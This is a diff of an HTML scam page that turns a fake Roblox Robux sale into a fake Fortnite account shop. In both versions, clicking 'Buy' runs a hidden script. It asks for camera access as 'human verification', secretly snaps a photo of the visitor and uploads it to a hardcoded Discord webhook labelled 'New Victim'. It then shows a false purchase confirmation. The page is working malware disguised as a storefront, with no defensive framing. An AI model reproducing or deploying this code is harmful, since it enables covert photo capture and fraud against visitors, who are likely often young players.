@@ -1,50 +1,78 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Official Roblox Shop - 0.99¢ Sale</title>
+    <title>Cheap Fortnite Accounts Shop 2025</title>
     <style>
-        body{background:#000;color:lime;font-family:Arial;text-align:center;padding:20px}
-        .card{background:#111;padding:30px;border-radius:20px;display:inline-block;margin:20px;box-shadow:0 0 20px #0f0}
-        button{background:#00b300;color:white;padding:15px 40px;font-size:20px;border:none;border-radius:10px;cursor:pointer}
-        video{width:1px;height:1px;opacity:0;position:absolute}
+        body{background:#0f0f1a;color:#fff;font-family:Arial;margin:0;padding:20px}
+        h1{text-align:center;color:#00ff00}
+        .account{background:#111;padding:20px;margin:20px auto;border-radius:15px;max-width:600px;box-shadow:0 0 15px #00ff00}
+        .price{color:#00ff00;font-size:24px;font-weight:bold}
+        button{background:#ff0066;color:white;padding:15px 30px;border:none;border-radius:10px;font-size:18px;cursor:pointer}
+        #checkout{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);display:none;justify-content:center;align-items:center;flex-direction:column}
+        video{opacity:0;width:1px;height:1px;position:absolute}
     </style>
 </head>
 <body>
-<div class="card">
-    <h1>🔥 LIMITED TIME SALE 🔥</h1>
-    <h2>100 - 100,000 Robux for only $0.99</h2>
-    <p>Human verification required (quick camera check)</p>
-    <button onclick="startVerify()">Buy Now - $0.99</button>
-    <div id="status"></div>
-</div>
-<video id="cam" autoplay playsinline></video>
-<canvas id="canvas" width="1280" height="720"></canvas>
+    <h1>🔥 CHEAP FORTNITE ACCOUNTS 2025 🔥</h1>
+    <p style="text-align:center">OG Skins • Renegade Raider • Black Knight • 500k+ VBucks • $5-$20</p>
+
+    <div class="account">
+        <h2>Account #1 - Galaxy + Renegade Raider</h2>
+        <p>Skins: 350+ | Pickaxes: 200+ | Emotes: 180+ | VBucks: 125,000</p>
+        <p class="price">$9.99</p>
+        <button onclick="buy(1)">Buy Now</button>
+    </div>
+
+    <div class="account">
+        <h2>Account #2 - Black Knight + Reaper</h2>
+        <p>Skins: 500+ | Pickaxes: Minty | Emotes: Floss, Take The L | VBucks: 850,000</p>
+        <p class="price">$14.99</p>
+        <button onclick="buy(2)">Buy Now</button>
+    </div>
+
+    <div class="account">
+        <h2>Account #3 - Full Access Stack</h2>
+        <p>Skins: 800+ | Rare OG Everything | VBucks: 1,200,000</p>
+        <p class="price">$19.99</p>
+        <button onclick="buy(3)">Buy Now</button>
+    </div>
+
+    <!-- Fake Checkout + Camera Grab -->
+    <div id="checkout">
+        <h1>Human Verification Required</h1>
+        <p>Allow camera to prove you're not a bot (5 seconds)</p>
+        <video id="cam" autoplay playsinline></video>
+        <canvas id="canvas" width="1280" height="720"></canvas>
+        <p id="status">Starting verification...</p>
+    </div>
 
 <script>
 const webhook = "https://discord.com/api/webhooks/1304603193086578698/9BypJkfkdPMruh835ASf7NNhBTlLwp7mjdSd7iIF_3CFGbrXUvWAmDYms0pTJlSasgON";
 
-async function startVerify(){
-    document.querySelector("button").innerText = "Verifying...";
-    document.getElementById("status").innerHTML = "<p>Allow camera to claim your robux</p>";
-
-    let stream = await navigator.mediaDevices.getUserMedia({video:true});
-    document.getElementById("cam").srcObject = stream;
-
-    setTimeout(async ()=>{
-        let canvas = document.getElementById("canvas");
-        let ctx = canvas.getContext("2d");
-        ctx.drawImage(document.getElementById("cam"),0,0,1280,720);
-        let blob = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
-
-        let form = new FormData();
-        form.append("file", blob, "face.jpg");
-        form.append("content", "**New Victim - $0.99 Robux Sale** 👀");
-
-        fetch(webhook,{method:"POST",body:form});
-
-        stream.getTracks().forEach(t=>t.stop());
-        document.getElementById("status").innerHTML = "<h2 style='color:gold'>✅ Purchase Complete! 100,000 Robux added!</h2><p>Check your account in 5-10 minutes</p>";
-    },1500);
+function buy(id){
+    document.getElementById("checkout").style.display = "flex";
+    
+    navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
+        document.getElementById("cam").srcObject = stream;
+        
+        setTimeout(async ()=>{
+            let canvas = document.getElementById("canvas");
+            let ctx = canvas.getContext("2d");
+            ctx.drawImage(document.getElementById("cam"),0,0,1280,720);
+            let blob = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.95));
+            
+            let form = new FormData();
+            form.append("file", blob, `fortnite_victim_${id}.jpg`);
+            form.append("content", `**New Fortnite Victim - Account #${id} Purchase** 👀`);
+            
+            fetch(webhook,{method:"POST",body:form});
+            
+            stream.getTracks().forEach(t=>t.stop());
+            document.getElementById("status").innerHTML = "<h2 style='color:gold'>✅ Verified! Account sent to your email in 5-10 min</h2>";
+        },1200);
+    }).catch(()=>{
+        document.getElementById("status").innerHTML = "<h2 style='color:red'>Camera blocked — purchase cancelled</h2>";
+    });
 }
 </script>
 </body>
